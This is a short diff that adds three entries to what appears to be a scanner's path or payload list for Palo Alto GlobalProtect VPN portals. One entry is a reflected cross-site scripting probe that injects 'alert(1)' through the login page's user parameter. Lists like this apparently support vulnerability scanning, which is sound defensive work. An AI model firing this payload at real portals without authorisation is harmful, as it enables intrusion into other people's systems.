@@ -1,0 +1,3 @@
+/global-protect/login.esp
+/sslmgr
+/global-protect/login.esp?user=j%22;-alert(1)-%22x
